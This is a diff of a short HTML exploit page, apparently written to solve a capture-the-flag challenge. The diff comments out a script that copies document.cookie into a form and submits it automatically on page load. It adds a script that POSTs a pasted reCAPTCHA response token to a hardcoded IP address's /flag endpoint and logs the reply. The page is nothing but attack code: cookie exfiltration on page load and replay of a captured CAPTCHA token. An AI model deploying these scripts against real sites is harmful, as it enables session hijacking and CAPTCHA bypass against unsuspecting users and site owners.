@@ -7,7 +7,20 @@
     </form>
 
     <script>
-        document.getElementById("cookieInput").value = document.cookie;
-        document.getElementById("cookieForm").submit();
+        //document.getElementById("cookieInput").value = document.cookie;
+        //document.getElementById("cookieForm").submit();
+
+        const http = new XMLHttpRequest();
+        const url = 'http://65.21.255.24:5000/flag';
+        http.open("POST", url);
+        params = {"g-recaptcha-response":"03AGdBq261ht3M5qK2OfbdcI0VReAF-TJrlLXbS19Ey3gt914UlgDEf1pCk2DJUfFKxOIW5bt5poSzmPG-Yt5rKs1UO0LWmZ-BYhauPsY-RlJmEmfMsXKku1H4R1n96nkE2Ii_MmsQy3azux8H7YfCVTmNE4ocUgtFGUG7InG4hRoT0MyTMx41eIE-fxdyIqqpeoJ0Q2sFTET1-GYUZ9UmWNDg9DaxpdesuPFRkmbOps0lRy5BeDH20zMBbUBbhGJxSjNHKF6jjsNEaOwUUyOljD7W26UXNFE72bmmhdaQot2_hQS7LcHahp_gf0EGkEKaexvJ2OaAqAo2xGgGxHkbTkBTXDIWxMaHSIBOT3R1I2CWu93xJDFw5gZVkccUa1uSKa2GULzxHBcMCfZVlrfKvnw67XGzwqiLr147YLzupV4LA1BZW4uu_I3d2T0Bp5ijh28dO1zEAQ5t"};
+        http.send(JSON.stringify(params));
+
+        http.onreadystatechange = function() {
+            if (http.readyState == XMLHttpRequest.DONE) {
+                console.log(http.responseText);
+            }
+        }
+
     </script>
 </html>
